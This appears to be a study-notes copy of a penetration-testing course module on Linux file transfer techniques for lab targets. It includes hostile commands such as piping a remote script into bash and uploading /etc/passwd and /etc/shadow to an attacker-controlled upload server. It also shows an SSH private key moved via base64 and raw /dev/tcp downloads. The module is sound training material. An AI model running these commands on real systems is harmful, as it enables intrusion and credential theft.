# Linux File Transfer Methods

***

## <mark style="color:red;">Download Operations</mark>

![image](https://academy.hackthebox.com/storage/modules/24/LinuxDownloadUpload.drawio.png)

### <mark style="color:blue;">Base64 Encoding / Decoding</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
{% endcode %}

We use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.

<mark style="color:orange;">**Pwnbox - Encode SSH Key to Base64**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tL--LQo=
```
{% endcode %}

We copy this content, paste it onto our Linux target machine, and use `base64` with the option \`-d' to decode it.

<mark style="color:orange;">**Linux - Decode the File**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ echo -n 'LS0tLS1C--lUkVtLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```
{% endcode %}

Finally, we can confirm if the file was transferred successfully using the `md5sum` command.

<mark style="color:orange;">**Linux - Confirm the MD5 Hashes Match**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

Note: You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

***

### <mark style="color:blue;">Web Downloads with Wget and cURL</mark>

<mark style="color:orange;">**Download a File Using wget**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
{% endcode %}

`cURL` is very similar to `wget`, but the output filename option is lowercase \`-o'.

<mark style="color:orange;">**Download a File Using cURL**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
{% endcode %}

***

### <mark style="color:blue;">Fileless Attacks Using Linux</mark>

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

Note: Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

<mark style="color:orange;">**Fileless Download with cURL**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
{% endcode %}

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

<mark style="color:orange;">**Fileless Download with wget**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```
{% endcode %}

***

### <mark style="color:blue;">Download with Bash (/dev/tcp)</mark>

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

<mark style="color:orange;">**Connect to the Target Webserver**</mark>

```purebasic
mrroboteLiot@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

<mark style="color:orange;">**HTTP GET Request**</mark>

```bash
mrroboteLiot@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

<mark style="color:orange;">**Print the Response**</mark>

```bash
mrroboteLiot@htb[/htb]$ cat <&3
```

***

### <mark style="color:blue;">SSH Downloads</mark>

`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.

Before we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.

<mark style="color:orange;">**Enabling the SSH Server**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ sudo systemctl enable ssh
```
{% endcode %}

<mark style="color:orange;">**Starting the SSH Server**</mark>

```bash
sudo systemctl start ssh
```

<mark style="color:orange;">**Checking for SSH Listening Port**</mark>

```bash
mrroboteLiot@htb[/htb]$ netstat -lnpt
```

Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.

```bash
mrroboteLiot@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

***

## <mark style="color:red;">Upload Operations</mark>

***

### <mark style="color:blue;">Web Upload</mark>

As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.

The first thing we need to do is to install the`uploadserver` module.

<mark style="color:orange;">**Pwnbox - Start Web Server**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ sudo python3 -m pip install --user uploadserver
```
{% endcode %}

Now we need to create a certificate. In this example, we are using a self-signed certificate.

<mark style="color:orange;">**Pwnbox - Create a Self-Signed Certificate**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
{% endcode %}

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

<mark style="color:orange;">**Pwnbox - Start Web Server**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ mkdir https && cd https
```
{% endcode %}

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```
{% endcode %}

Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

<mark style="color:orange;">**Linux - Upload Multiple Files**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
{% endcode %}

We used the option `--insecure` because we used a self-signed certificate that we trust.

***

### <mark style="color:blue;">Alternative Web File Transfer Method</mark>

Since Linux distributions usually have `Python` or `php` installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.

It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.

<mark style="color:orange;">**Linux - Creating a Web Server with Python3**</mark>

```bash
mrroboteLiot@htb[/htb]$ python3 -m http.server
```

<mark style="color:orange;">**Linux - Creating a Web Server with Python2.7**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ python2.7 -m SimpleHTTPServer
```

<mark style="color:orange;">**Linux - Creating a Web Server with PHP**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ php -S 0.0.0.0:8000
```

<mark style="color:orange;">**Linux - Creating a Web Server with Ruby**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ ruby -run -ehttpd . -p8000
```

<mark style="color:orange;">**Download the File from the Target Machine onto the Pwnbox**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
```

Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

***

### <mark style="color:blue;">SCP Upload</mark>

We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.

**File Upload using SCP**

```shell-session
mrroboteLiot@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/                                                                                                         100% 3414     6.7MB/s   00:00
```

Note: Remember that scp syntax is similar to cp or copy.
